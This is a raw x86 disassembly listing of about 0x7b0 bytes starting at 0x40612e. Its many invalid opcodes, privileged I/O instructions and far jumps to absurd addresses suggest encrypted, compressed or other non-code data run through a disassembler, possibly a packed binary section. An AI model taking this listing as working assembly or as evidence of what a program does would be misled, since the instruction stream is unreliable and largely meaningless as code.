  40612e:	jmp    0x406199
  406130:	xor    eax,0x887da06f
  406135:	inc    esi
  406136:	scas   eax,DWORD PTR es:[edi]
  406137:	adc    eax,0xffa3e587
  40613c:	jae    0x406156
  40613e:	int3   
  40613f:	(bad)  
  406141:	scas   eax,DWORD PTR es:[edi]
  406142:	(bad)  
  406143:	repz push ebp
  406145:	repz jl 0x4060f2
  406148:	push   ss
  406149:	or     edx,DWORD PTR [ebp-0xe]
  40614c:	cwde   
  40614d:	dec    ebp
  40614e:	push   ecx
  40614f:	dec    ebx
  406150:	arpl   sp,bx
  406152:	xchg   edi,eax
  406153:	push   0xd9808988
  406158:	repnz xchg ebp,eax
  40615a:	dec    ebp
  40615b:	sub    BYTE PTR [esi+0x3b6976b4],ch
  406161:	adc    ebx,DWORD PTR [esp+ebx*2+0x72]
  406165:	sub    esp,esp
  406167:	or     BYTE PTR [eax+0x7823fabd],0x6e
  40616e:	es in  al,0x2f
  406171:	jmp    0x406117
  406173:	xor    esp,DWORD PTR [eax+eiz*2-0x59]
  406177:	leave  
  406178:	dec    ebp
  406179:	fild   WORD PTR [ebp-0x37]
  40617c:	xchg   edx,eax
  40617d:	lock loop 0x4061f8
  406180:	xchg   DWORD PTR ds:0x71fb7c37,edi
  406186:	xor    bl,ch
  406188:	mov    ds:0xa0e8c330,eax
  40618d:	sub    BYTE PTR [ebp-0x33],ch
  406190:	sbb    BYTE PTR [eax],0x68
  406193:	outs   dx,BYTE PTR ds:[esi]
  406194:	adc    al,al
  406196:	sti    
  406197:	mov    dh,0xc8
  406199:	inc    eax
  40619a:	inc    DWORD PTR [ecx+0x20]
  40619d:	jo     0x40615c
  40619f:	scas   al,BYTE PTR es:[edi]
  4061a0:	mov    al,BYTE PTR [eax]
  4061a2:	jmp    0x3b69:0x266ea750
  4061a9:	mov    ah,0xa6
  4061ab:	enter  0x3b84,0x8b
  4061af:	and    DWORD PTR [edx-0x11],esi
  4061b2:	mov    bh,0x18
  4061b4:	jae    0x406159
  4061b6:	stos   BYTE PTR es:[edi],al
  4061b7:	mov    ds:0x1aa49c6,eax
  4061bc:	das    
  4061bd:	ud0    edx,DWORD PTR [ebp-0x2de08ab7]
  4061c4:	mov    ?,WORD PTR [bp+0x6694]
  4061c9:	cmp    eax,0x57fda186
  4061ce:	cmp    esi,ecx
  4061d0:	(bad)  
  4061d1:	out    dx,al
  4061d2:	imul   eax,DWORD PTR [ecx+0x32],0xffffff89
  4061d6:	push   es
  4061d7:	xchg   BYTE PTR [ebx-0x3d],ch
  4061da:	jbe    0x406160
  4061dc:	pop    esp
  4061dd:	iret   
  4061de:	jne    0x4061f6
  4061e0:	or     al,0xcb
  4061e2:	adc    eax,0x93850309
  4061e7:	and    BYTE PTR [edx-0x6e7a4955],dh
  4061ed:	adc    eax,0x6e1a8ae5
  4061f2:	add    al,0xbc
  4061f4:	fdivr  QWORD PTR [eax-0xf]
  4061f7:	aam    0xfe
  4061f9:	or     eax,ebp
  4061fb:	imul   esi,edx,0x91d22fdc
  406201:	out    dx,eax
  406202:	xchg   esp,eax
  406203:	iret   
  406204:	and    al,0x5f
  406206:	ret    
  406207:	loop   0x406260
  406209:	ret    0x490c
  40620c:	retf   0xc3b4
  40620f:	clc    
  406210:	mov    BYTE PTR [ebx-0x305bb288],dh
  406216:	(bad)  
  406218:	ret    
  406219:	xchg   esi,eax
  40621a:	stos   DWORD PTR es:[edi],eax
  40621b:	mov    al,0x37
  40621d:	ret    0xf4ac
  406220:	and    DWORD PTR [edx-0x25],esp
  406223:	dec    ebx
  406224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406225:	xor    dh,BYTE PTR [edx]
  406227:	ins    DWORD PTR es:[edi],dx
  406228:	xchg   edi,eax
  406229:	ret    
  40622a:	sahf   
  40622b:	cdq    
  40622c:	sahf   
  40622d:	add    dh,cl
  40622f:	xchg   DWORD PTR [eax-0x66],ebp
  406232:	in     al,0x74
  406234:	xchg   ebx,edx
  406236:	cli    
  406237:	ror    DWORD PTR [eax-0x62],1
  40623a:	repz hlt 
  40623c:	and    eax,0xaef59a4d
  406241:	adc    eax,0xffffffb2
  406244:	test   DWORD PTR [esp+edx*1-0x2b],ebx
  406248:	mov    dl,0x2a
  40624a:	fidivr WORD PTR [ebp+0xbb1321]
  406250:	sbb    bl,BYTE PTR [ecx]
  406252:	jae    0x40629a
  406254:	(bad)
  406257:	push   esp
  406258:	mov    ch,0xe1
  40625a:	xchg   ebx,eax
  40625b:	sub    DWORD PTR [edi-0x17],esi
  40625e:	(bad)  
  40625f:	mov    bl,0x8
  406261:	mov    dh,BYTE PTR [edi+0x4891b504]
  406267:	imul   esi,esi,0x88fdec18
  40626d:	test   al,0xa2
  40626f:	mov    al,0xf4
  406271:	jmp    0x3259171c
  406276:	jmp    0x40626b
  406278:	ins    DWORD PTR es:[edi],dx
  406279:	pop    esp
  40627a:	nop
  40627b:	sbb    cl,BYTE PTR ds:0x4cf13279
  406281:	dec    esi
  406282:	sbb    DWORD PTR [ebx-0x5c018ac5],ebp
  406288:	and    ch,BYTE PTR [esi]
  40628a:	nop
  40628b:	ins    BYTE PTR es:[edi],dx
  40628c:	icebp  
  40628d:	mov    ah,0x33
  40628f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406290:	xchg   esp,eax
  406291:	mul    BYTE PTR [eax+0x19]
  406294:	daa    
  406295:	out    0x20,eax
  406297:	int3   
  406298:	fisub  WORD PTR [edi]
  40629a:	or     esp,DWORD PTR [eax+0x7bd2f521]
  4062a0:	dec    edi
  4062a1:	mov    ecx,0x86496ca2
  4062a6:	jg     0x4062e6
  4062a8:	int3   
  4062a9:	push   cs
  4062aa:	jge    0x4062e4
  4062ac:	fld    DWORD PTR [esi]
  4062ae:	dec    eax
  4062af:	loope  0x4062aa
  4062b1:	popf   
  4062b2:	aaa    
  4062b3:	xchg   DWORD PTR [edx-0x18],edi
  4062b6:	mov    eax,ds:0xfc842799
  4062bb:	push   ecx
  4062bc:	inc    eax
  4062bd:	mov    dh,0xd
  4062bf:	scas   eax,DWORD PTR es:[edi]
  4062c0:	dec    edi
  4062c1:	arpl   WORD PTR [edx+edx*2+0xb9ed6ff],bx
  4062c8:	mov    al,0xb5
  4062ca:	add    esp,DWORD PTR [edi]
  4062cc:	fwait
  4062cd:	jmp    0x406320
  4062cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062d0:	sbb    al,0x68
  4062d2:	add    eax,0xa61b7958
  4062d7:	xchg   edi,eax
  4062d8:	cs retf 
  4062da:	out    0x23,al
  4062dc:	jmp    0xfd89:0x454e50cb
  4062e3:	mov    eax,0x238cae1a
  4062e8:	stos   BYTE PTR es:[edi],al
  4062e9:	les    edx,FWORD PTR [esi+eax*1-0x70325317]
  4062f0:	sbb    eax,0x2c173b69
  4062f5:	jae    0x4062a5
  4062f7:	jp     0x4062c5
  4062f9:	mov    edx,0x8748c6a0
  4062fe:	daa    
  4062ff:	jbe    0x406359
  406301:	icebp  
  406302:	aam    0x65
  406304:	mov    ebx,0xf6de6ee5
  406309:	test   ebx,ecx
  40630b:	dec    ebx
  40630c:	xchg   ebp,eax
  40630d:	std    
  40630e:	cmp    DWORD PTR [esi-0x59919c25],ebx
  406314:	mov    ds,WORD PTR [ebp-0x1c32d2a]
  40631a:	and    DWORD PTR [esi],edx
  40631c:	(bad)  
  40631d:	cmp    al,0x8a
  40631f:	div    DWORD PTR [ecx-0x60]
  406322:	adc    DWORD PTR [esi+0x4],0x1d77538e
  406329:	mov    gs,WORD PTR [ecx+0x539abc53]
  40632f:	loop   0x4062c2
  406331:	mov    al,ds:0x148cdc39
  406336:	les    edi,FWORD PTR [ebx-0x52]
  406339:	(bad)
  40633c:	lods   al,BYTE PTR ds:[esi]
  40633d:	lahf   
  40633e:	cmp    ecx,DWORD PTR ds:0xb5b206aa
  406344:	add    eax,ebx
  406346:	pop    esi
  406347:	fiadd  WORD PTR [ecx]
  406349:	pop    eax
  40634a:	lahf   
  40634b:	cmp    eax,0x8faea879
  406350:	popa   
  406351:	jnp    0x4062ed
  406353:	push   esi
  406354:	adc    BYTE PTR [edx+0x6b148276],cl
  40635a:	retf   0xfab8
  40635d:	in     al,dx
  40635e:	and    bl,BYTE PTR [edx]
  406360:	dec    eax
  406361:	adc    al,0x60
  406363:	gs push 0xfffffff3
  406366:	pop    ecx
  406367:	retf   0xb1b2
  40636a:	xor    eax,0xc43a2577
  40636f:	pop    es
  406370:	out    dx,eax
  406371:	xchg   ecx,eax
  406372:	xor    dh,BYTE PTR [ecx+0x59]
  406375:	test   DWORD PTR [eax+0x61],ecx
  406378:	adc    DWORD PTR fs:[ebp+0x77],esp
  40637c:	test   eax,0xf74b6a1e
  406381:	pop    ss
  406382:	cld    
  406383:	adc    ch,BYTE PTR [ebp+0x2b]
  406386:	lahf   
  406387:	mov    esi,0xa64d51f5
  40638c:	jnp    0x4063b2
  40638e:	push   ecx
  40638f:	iret   
  406390:	retf   
  406391:	std    
  406392:	push   0xffffff9b
  406394:	fdivr  DWORD PTR [ebx+0x40]
  406397:	shl    BYTE PTR [eax],1
  406399:	jmp    0xdbb55769
  40639e:	test   BYTE PTR [esi+0x70],bl
  4063a1:	mov    eax,ds:0xc76d9e6
  4063a6:	adc    bh,BYTE PTR [ebp+0x13]
  4063a9:	in     eax,dx
  4063aa:	aas    
  4063ab:	adc    BYTE PTR [edi+0x13d726f3],al
  4063b1:	inc    edx
  4063b2:	stos   BYTE PTR es:[edi],al
  4063b3:	paddsb mm3,QWORD PTR [esi]
  4063b6:	cmp    eax,0x151cf357
  4063bb:	and    eax,0xefe37eaa
  4063c0:	mov    cl,0x83
  4063c2:	pop    esi
  4063c3:	ficomp DWORD PTR [esi+ecx*2+0x524468e1]
  4063ca:	add    bh,bl
  4063cc:	push   0xffffff9c
  4063ce:	loopne 0x406412
  4063d0:	(bad)  
  4063d1:	fadd   DWORD PTR [edi-0x7ee7b767]
  4063d7:	mov    al,ds:0xaa81827
  4063dc:	pop    ebp
  4063dd:	sub    edi,DWORD PTR [esi-0x64]
  4063e0:	sub    eax,0xaf91ae16
  4063e5:	pop    edi
  4063e6:	arpl   WORD PTR [esi],bx
  4063e8:	or     eax,0xb5e73e47
  4063ed:	cmp    al,0xa3
  4063ef:	cwde   
  4063f0:	scas   al,BYTE PTR es:[edi]
  4063f1:	into   
  4063f2:	mov    WORD PTR ds:0x2c84866c,?
  4063f8:	xor    al,0x94
  4063fa:	call   DWORD PTR [edx+esi*2-0x7a]
  4063fe:	pop    ds
  4063ff:	mov    edi,0x45d581d2
  406404:	icebp  
  406405:	pop    edi
  406406:	cld    
  406407:	push   ds
  406408:	pop    ss
  406409:	out    dx,eax
  40640a:	xchg   edx,eax
  40640b:	mov    ebx,0x9292ba62
  406410:	or     eax,0xe9e36a99
  406415:	in     al,0x5e
  406417:	pop    eax
  406418:	repnz and al,0xa6
  40641b:	jmp    0x2ebd:0xbcbbe619
  406422:	stos   BYTE PTR es:[edi],al
  406423:	(bad)  
  406425:	jp     0x4063a8
  406427:	in     al,0x45
  406429:	adc    al,0x7
  40642b:	shl    esp,1
  40642d:	sbb    eax,0x6953485f
  406432:	out    dx,eax
  406433:	lods   eax,DWORD PTR ds:[esi]
  406434:	shl    BYTE PTR [ecx+0x60],1
  406437:	iret   
  406438:	adc    esi,DWORD PTR [edi+eiz*1]
  40643b:	sub    bl,0x15
  40643e:	mov    edx,0x8090f81a
  406443:	int    0xa0
  406445:	outs   dx,DWORD PTR ds:[esi]
  406446:	sbb    BYTE PTR ds:0xfb1d9a9,dl
  40644c:	stos   DWORD PTR es:[edi],eax
  40644d:	cwde   
  40644e:	mov    eax,0x74329ce2
  406453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406454:	dec    esp
  406455:	clc    
  406456:	mov    ebp,0x1ac66409
  40645b:	inc    esp
  40645c:	stc    
  40645d:	add    al,0x3
  40645f:	mov    dh,0xd9
  406461:	push   ss
  406462:	mov    esi,DWORD PTR [esi]
  406464:	add    bh,dl
  406466:	add    eax,0xd24c7aca
  40646b:	test   DWORD PTR [ecx-0xe],ebx
  40646e:	call   0x81204a7b
  406473:	fidiv  DWORD PTR [eax-0x28]
  406476:	loope  0x406403
  406478:	outs   dx,DWORD PTR ds:[esi]
  406479:	pusha  
  40647a:	ins    BYTE PTR es:[edi],dx
  40647b:	dec    esi
  40647c:	mov    dh,0xd
  40647e:	mov    ebx,0x20d5efd6
  406483:	xchg   DWORD PTR [edx],ebx
  406485:	pushf  
  406486:	(bad)  
  406487:	cld    
  406488:	push   edx
  406489:	popa   
  40648a:	stos   BYTE PTR es:[edi],al
  40648b:	int    0xb4
  40648d:	repz push ecx
  40648f:	sbb    BYTE PTR [eax+0x21c344e3],ah
  406495:	mov    dh,0x77
  406497:	in     al,dx
  406498:	fsubr  QWORD PTR [edi+0x26]
  40649b:	jno    0x406512
  40649d:	js     0x406501
  40649f:	inc    ebp
  4064a0:	push   edx
  4064a1:	sbb    DWORD PTR [ebx],eax
  4064a3:	xor    eax,0xc0b23aef
  4064a8:	cmp    ecx,esp
  4064aa:	pop    ebp
  4064ab:	jnp    0x406528
  4064ad:	jle    0x4064e9
  4064af:	xor    DWORD PTR [edx],0xcdbf9b85
  4064b5:	cld    
  4064b6:	ins    BYTE PTR es:[edi],dx
  4064b7:	(bad)  
  4064b8:	fcmovb st,st(7)
  4064ba:	sub    dl,cl
  4064bc:	stos   BYTE PTR es:[edi],al
  4064bd:	push   0xcb506c8b
  4064c2:	jne    0x406530
  4064c4:	sbb    BYTE PTR ds:0x6815cc3f,dh
  4064ca:	mov    eax,ds:0x74a6a8f7
  4064cf:	cmp    al,0x98
  4064d1:	or     BYTE PTR [eiz*1+0x25dfbcc8],dh
  4064d8:	xor    edx,edx
  4064da:	push   esi
  4064db:	jg     0x40654d
  4064dd:	or     al,0x31
  4064df:	cmp    al,0xfb
  4064e1:	mov    BYTE PTR [ebp+0x6e],ah
  4064e4:	ds test esi,esp
  4064e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064e8:	xchg   BYTE PTR [eax+0x38f9223a],bl
  4064ee:	aam    0x4a
  4064f0:	adc    eax,DWORD PTR ds:0x6f84eea5
  4064f6:	arpl   WORD PTR [ebx-0x7b],ax
  4064f9:	push   esp
  4064fa:	into   
  4064fb:	pop    ebx
  4064fc:	jge    0x4064f7
  4064fe:	inc    esp
  4064ff:	pop    ebp
  406500:	dec    eax
  406501:	fisubr WORD PTR [ebx]
  406503:	push   cs
  406504:	test   eax,0x6ef48ee0
  406509:	ins    BYTE PTR es:[edi],dx
  40650a:	es outs dx,DWORD PTR cs:[esi]
  40650d:	outs   dx,BYTE PTR ds:[esi]
  40650e:	cld    
  40650f:	sbb    al,0x8a
  406511:	ror    eax,0x75
  406514:	adc    dl,BYTE PTR [edi+eax*8-0x2e]
  406518:	nop
  406519:	push   ebp
  40651a:	mov    dl,0xfe
  40651c:	(bad)  
  40651d:	lea    eax,[esp+edx*1]
  406520:	iret   
  406521:	xchg   ecx,eax
  406522:	add    eax,0xf7eeaece
  406527:	mov    ah,0xf9
  406529:	dec    esp
  40652a:	dec    DWORD PTR [ebx]
  40652c:	dec    eax
  40652d:	and    eax,0x8cbe06af
  406532:	push   esi
  406533:	or     BYTE PTR [eax+0x1a],ch
  406536:	pop    esi
  406537:	test   DWORD PTR [ebx-0x7e],0x865db7b2
  40653e:	jne    0x4065b4
  406540:	cmp    BYTE PTR [edx],dl
  406542:	push   0x1d
  406544:	stc    
  406545:	jle    0x4064de
  406547:	push   DWORD PTR [edx+0x65a4c795]
  40654d:	jg     0x406575
  40654f:	pushf  
  406550:	mov    dh,0x32
  406552:	dec    edi
  406553:	add    ah,ah
  406555:	lods   eax,DWORD PTR ds:[esi]
  406556:	push   ecx
  406557:	inc    ebp
  406558:	fild   WORD PTR ds:0x3da28666
  40655e:	dec    ebp
  40655f:	sub    ecx,esp
  406561:	fldenv [ebx-0x1d]
  406564:	mov    esi,0xd6d15da8
  406569:	ja     0x406505
  40656b:	mov    ecx,0xa1c8e080
  406570:	lock outs dx,BYTE PTR ds:[esi]
  406572:	inc    ecx
  406573:	enter  0x8b2,0x1c
  406577:	popa   
  406578:	mov    al,0x8e
  40657a:	imul   ebp,DWORD PTR [eax-0x67],0x60fc2e9c
  406581:	jb     0x4065a3
  406583:	dec    ebx
  406584:	bnd jbe 0x406557
  406587:	sub    eax,0x11b5eaf1
  40658c:	cwde   
  40658d:	pop    ss
  40658e:	fisttp WORD PTR [ecx]
  406590:	sub    BYTE PTR [ebx+ebp*8+0x53],ch
  406594:	mov    ds:0x4cdaa894,eax
  406599:	jmp    DWORD PTR [eax+0xa]
  40659c:	adc    al,0xfe
  40659e:	mov    ecx,0x1b5a7a42
  4065a3:	ss ins BYTE PTR es:[edi],dx
  4065a5:	in     al,dx
  4065a6:	sub    bl,ah
  4065a8:	mov    esp,0x4555c95
  4065ad:	ret    0xa777
  4065b0:	inc    bp
  4065b2:	ret    0xd394
  4065b5:	mov    ds:0xfeab53b7,eax
  4065ba:	fist   WORD PTR [eax+0x2e026c40]
  4065c0:	xor    eax,0x3031fb5
  4065c5:	push   es
  4065c6:	nop
  4065c7:	push   edi
  4065c8:	ins    DWORD PTR es:[edi],dx
  4065c9:	int3   
  4065ca:	rcl    edi,0x46
  4065cd:	inc    ebp
  4065ce:	ins    DWORD PTR es:[edi],dx
  4065cf:	fs dec ebx
  4065d1:	dec    edi
  4065d2:	xor    al,0x8b
  4065d4:	add    esp,DWORD PTR [esi+0x39515eee]
  4065da:	clc    
  4065db:	hlt    
  4065dc:	or     ah,al
  4065de:	or     ch,BYTE PTR [ebp-0x4d]
  4065e1:	push   ecx
  4065e2:	ret    0x5761
  4065e5:	outs   dx,DWORD PTR ds:[esi]
  4065e6:	in     al,0x14
  4065e8:	iret   
  4065e9:	fsubp  st(0),st
  4065eb:	pop    esp
  4065ec:	push   0x77eb1b09
  4065f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065f2:	cmp    ch,bh
  4065f4:	cs inc edx
  4065f6:	mov    esi,0xe12a2c8f
  4065fb:	and    eax,DWORD PTR ds:0x9fdae8e
  406601:	pop    ecx
  406602:	repz fist WORD PTR [esi]
  406605:	and    ch,BYTE PTR [ebx-0x50]
  406608:	dec    ebx
  406609:	(bad)  ds:[eax]
  40660c:	or     dl,dl
  40660e:	(bad)  
  40660f:	mov    dl,0x10
  406611:	ins    BYTE PTR es:[edi],dx
  406612:	xor    bl,BYTE PTR [ebx+0x7181d74f]
  406618:	and    eax,0xc8fe1d5c
  40661d:	cmp    DWORD PTR [ebp+0x59],ebx
  406620:	cdq    
  406621:	out    0xc3,al
  406623:	sbb    edi,ebp
  406625:	clc    
  406626:	test   DWORD PTR [eax],edi
  406628:	cld    
  406629:	fbld   TBYTE PTR [ebx-0x66]
  40662c:	lds    eax,FWORD PTR [ebp-0x60]
  40662f:	cmp    BYTE PTR [esp+eax*1],dl
  406632:	mov    edx,0x80e729b3
  406637:	mov    esp,0xef44bb43
  40663c:	jmp    DWORD PTR [ebp+0x4e]
  40663f:	frstor [edx+0x5d403455]
  406645:	jnp    0x4066bf
  406647:	outs   dx,DWORD PTR ds:[esi]
  406648:	pop    DWORD PTR [eax]
  40664a:	pop    ebp
  40664b:	pop    esi
  40664c:	pop    eax
  40664d:	xchg   DWORD PTR [ebp+0x5735de2f],ebx
  406653:	mov    cl,0xc6
  406655:	dec    edi
  406656:	adc    edi,edi
  406658:	inc    ebp
  406659:	xlat   BYTE PTR ds:[ebx]
  40665a:	and    DWORD PTR ds:0xe65f7b59,edx
  406660:	jecxz  0x406688
  406662:	sahf   
  406663:	clc    
  406664:	xlat   BYTE PTR ds:[ebx]
  406665:	push   edi
  406666:	add    BYTE PTR [esi+0x15aadf02],0x63
  40666d:	gs or  DWORD PTR ss:[ecx],0xffffff8e
  406672:	add    eax,0xeb084812
  406677:	outs   dx,BYTE PTR ds:[esi]
  406678:	xor    DWORD PTR [ecx+0x23],0x9e14ed25
  40667f:	mov    BYTE PTR [ecx+0x78ac62db],0xf
  406686:	outs   dx,DWORD PTR ds:[esi]
  406687:	mov    dh,0x70
  406689:	(bad)  
  40668a:	xor    ah,BYTE PTR [eax+0x63]
  40668d:	adc    al,0xe9
  40668f:	clc    
  406690:	lds    esi,FWORD PTR [edi-0x67d1c879]
  406696:	pop    eax
  406697:	pusha  
  406698:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406699:	and    eax,0x2548c3a4
  40669e:	ret    0x1891
  4066a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066a2:	mov    ch,0xe7
  4066a4:	xchg   esi,eax
  4066a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066a6:	xchg   ebx,eax
  4066a7:	pop    esi
  4066a8:	adc    DWORD PTR [edx],edi
  4066aa:	lods   eax,DWORD PTR ds:[esi]
  4066ab:	stos   DWORD PTR es:[edi],eax
  4066ac:	inc    eax
  4066ad:	cmp    ebp,DWORD PTR [ecx+edi*4-0x4f]
  4066b1:	push   ebx
  4066b2:	ins    BYTE PTR es:[edi],dx
  4066b3:	mov    BYTE PTR [edi+0x55f89222],cl
  4066b9:	mov    edx,0x9cde2d53
  4066be:	or     DWORD PTR [eax+0x81a4593],esi
  4066c4:	fwait
  4066c5:	pop    esi
  4066c6:	in     eax,dx
  4066c7:	or     edi,DWORD PTR [esp+ecx*4-0x1b]
  4066cb:	aaa    
  4066cc:	or     BYTE PTR [eax],bl
  4066ce:	pop    edx
  4066cf:	push   0x67
  4066d1:	cmp    edx,DWORD PTR [eax-0x4d]
  4066d4:	out    dx,eax
  4066d5:	mov    esp,0x92b48287
  4066da:	stos   BYTE PTR es:[edi],al
  4066db:	jb     0x406749
  4066dd:	adc    eax,0x1340459f
  4066e2:	retf   
  4066e3:	in     eax,dx
  4066e4:	xor    BYTE PTR [ebx-0x591957fe],ah
  4066ea:	mov    esi,ebp
  4066ec:	iret   
  4066ed:	inc    edx
  4066ee:	mov    dl,0x71
  4066f0:	frstor [ebx+0x42596b62]
  4066f6:	lahf   
  4066f7:	enter  0x954c,0x91
  4066fb:	and    DWORD PTR [edi],edi
  4066fd:	xchg   ecx,eax
  4066fe:	outs   dx,DWORD PTR ds:[esi]
  4066ff:	and    DWORD PTR ds:0xa40d6c41,0x55f8546
  406709:	adc    esi,DWORD PTR [esi]
  40670b:	dec    esi
  40670c:	jp     0x4066aa
  40670e:	sub    al,al
  406710:	mov    cl,0x81
  406712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406713:	inc    esp
  406714:	not    BYTE PTR [esi-0x3b18c761]
  40671a:	int3   
  40671b:	fist   DWORD PTR [eax+0x45]
  40671e:	and    DWORD PTR [edi+eax*2-0x41],ebp
  406722:	jg     0x40678c
  406724:	push   0xffffffb1
  406726:	retf   0xc74
  406729:	push   ss
  40672a:	xor    ebx,DWORD PTR [esp+ecx*8+0x23]
  40672e:	(bad)  
  406730:	mov    ebp,0x1e18b90
  406735:	xchg   edi,eax
  406736:	les    edi,FWORD PTR [ebx+edi*1-0x30]
  40673a:	push   edx
  40673b:	popa   
  40673c:	mov    esi,0x11f92d4b
  406741:	sub    cl,al
  406743:	int3   
  406744:	push   ds
  406745:	sub    DWORD PTR [eax+0x33],esp
  406748:	stos   DWORD PTR es:[edi],eax
  406749:	cmc    
  40674a:	ja     0x406747
  40674c:	mov    dl,0xa4
  40674e:	fs and ah,dl
  406751:	popa   
  406752:	loope  0x40673e
  406754:	inc    ecx
  406755:	shl    DWORD PTR [ebp-0x317f1007],cl
  40675b:	push   cs
  40675c:	xchg   BYTE PTR [eax+0xb],bh
  40675f:	repnz push eax
  406761:	pop    esi
  406762:	xchg   edi,eax
  406763:	push   0xffffffbd
  406765:	stos   BYTE PTR es:[edi],al
  406766:	lea    eax,[esp+ebp*8-0x56806c27]
  40676d:	xlat   BYTE PTR ds:[ebx]
  40676e:	xchg   esi,eax
  40676f:	iret   
  406770:	adc    BYTE PTR [edi],ah
  406772:	or     edi,ebp
  406774:	icebp  
  406775:	shl    edx,cl
  406777:	jo     0x4067c0
  406779:	retf   0x81b5
  40677c:	cs stc 
  40677e:	xchg   edi,eax
  40677f:	inc    eax
  406780:	inc    ecx
  406781:	call   0x632:0x3aa81ead
  406788:	(bad)  
  406789:	aad    0x87
  40678b:	or     al,0x81
  40678d:	add    eax,DWORD PTR ds:0xd77a262e
  406793:	and    al,0xeb
  406795:	aam    0xcc
  406797:	pop    ebp
  406798:	add    BYTE PTR [ecx-0x4622e4f5],0xae
  40679f:	mov    bl,0x98
  4067a1:	mov    DWORD PTR [esi+0x35b577b8],0xa89ca733
  4067ab:	sub    ebp,DWORD PTR [edx+ebx*8-0x7b]
  4067af:	cdq    
  4067b0:	outs   dx,DWORD PTR ds:[esi]
  4067b1:	ret    0x6c25
  4067b4:	inc    edx
  4067b5:	(bad)  
  4067b7:	xor    bh,BYTE PTR [edi+ebx*2]
  4067ba:	(bad)  
  4067bb:	iret   
  4067bc:	jne    0x406806
  4067be:	pop    ebp
  4067bf:	and    DWORD PTR [eax+0xc],ebp
  4067c2:	cmp    ch,BYTE PTR [edi-0x3aadc8e6]
  4067c8:	ret    
  4067c9:	fcom   DWORD PTR [esi-0x34]
  4067cc:	jecxz  0x4067f2
  4067ce:	sub    al,0x66
  4067d0:	daa    
  4067d1:	out    0xd1,eax
  4067d3:	push   edi
  4067d4:	mov    ds:0x4aff8717,al
  4067d9:	je     0x4067ae
  4067db:	cmp    DWORD PTR [eax+0x7e296a76],eax
  4067e1:	jns    0x4067c2
  4067e3:	fimul  WORD PTR [eax]
  4067e5:	pop    ebp
  4067e6:	add    eax,0x5333806d
  4067eb:	pop    ss
  4067ec:	mov    ch,dh
  4067ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067ef:	ss das 
  4067f1:	pop    ebp
  4067f2:	icebp  
  4067f3:	arpl   WORD PTR [ebp-0xc],bp
  4067f6:	add    ecx,esi
  4067f8:	mov    esp,0xa1cf1c9a
  4067fd:	sbb    al,0x8f
  4067ff:	and    DWORD PTR [edi+0x1f],ecx
  406802:	mov    dh,0x5b
  406804:	xor    al,0xd0
  406806:	dec    edi
  406807:	xchg   ecx,eax
  406808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406809:	pusha  
  40680a:	aaa    
  40680b:	lahf   
  40680c:	inc    dl
  40680e:	jno    0x4067f5
  406810:	xor    BYTE PTR [edi],bh
  406812:	jmp    0x406816
  406814:	xor    ebp,DWORD PTR [edi]
  406816:	mov    edx,0xba34c0cb
  40681b:	push   esp
  40681c:	push   edx
  40681d:	sub    dl,BYTE PTR [ecx]
  40681f:	cmp    edi,ebp
  406821:	psubsw mm4,mm6
  406824:	test   dl,cl
  406826:	shr    ch,0x51
  406829:	xor    DWORD PTR [edx+0x186a184],esp
  40682f:	dec    edx
  406830:	dec    esi
  406831:	out    0xd4,al
  406833:	arpl   WORD PTR [eax-0x1f],si
  406836:	and    eax,0x9acba004
  40683b:	sbb    al,BYTE PTR [ebp+0x5e]
  40683e:	xor    DWORD PTR [edi+0xb],edx
  406841:	mov    ch,0x5e
  406843:	push   ecx
  406844:	jne    0x4067d9
  406846:	mov    esp,DWORD PTR [esi+0x7d1929c8]
  40684c:	xchg   ecx,eax
  40684d:	adc    DWORD PTR [edx+0x1fe49e86],ecx
  406853:	ret    0xae97
  406856:	xchg   esi,eax
  406857:	cmp    ebx,esp
  406859:	push   ecx
  40685a:	dec    edx
  40685b:	push   cs
  40685c:	js     0x406879
  40685e:	fst    DWORD PTR [eax-0x56151d5]
  406864:	pop    eax
  406865:	fstp   QWORD PTR [edx]
  406867:	lock enter 0x9164,0x43
  40686c:	daa    
  40686d:	jbe    0x40688d
  40686f:	add    bl,bl
  406871:	push   es
  406872:	call   0x6041989e
  406877:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406878:	xchg   edx,eax
  406879:	adc    al,BYTE PTR [ecx+edx*1+0x18]
  40687d:	lea    ecx,[edi]
  40687f:	imul   BYTE PTR [ebx+0x7463ac05]
  406885:	dec    edi
  406886:	cmp    cl,BYTE PTR [edi+0x1285de8f]
  40688c:	xor    BYTE PTR [ebp-0x4f],al
  40688f:	sti    
  406890:	ror    BYTE PTR [edx-0x19ca3436],0x37
  406897:	into   
  406898:	(bad)  gs:[edi-0x60814b0e]
  40689f:	test   DWORD PTR [edx-0x13],ebx
  4068a2:	sub    al,0x2f
  4068a4:	js     0x406828
  4068a6:	dec    ebp
  4068a7:	cmp    esp,ecx
  4068a9:	out    dx,al
  4068aa:	cs test al,0x6c
  4068ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068ae:	lock aam 0x4d
  4068b1:	sub    edx,DWORD PTR [ebx]
  4068b3:	(bad)  
  4068b4:	inc    esp
  4068b6:	cs inc edi
  4068b8:	inc    ebp
  4068b9:	stc    
  4068ba:	(bad)  
  4068bb:	lods   eax,DWORD PTR ds:[esi]
  4068bc:	push   esp
  4068bd:	ror    DWORD PTR [eax-0x2140bcd5],1
  4068c3:	sti    
  4068c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068c5:	xor    eax,ebp
  4068c7:	repnz and eax,0x4ada6668
  4068cd:	push   ss
  4068ce:	and    esi,ebx
  4068d0:	lock fs out 0x3b,eax
  4068d4:	sbb    ch,BYTE PTR [eax-0x71dfa60b]
  4068da:	fistp  QWORD PTR [eax+0x2d06b94b]
  4068e0:	in     eax,dx
  4068e1:	into   
  4068e2:	jmp    0x4068f5
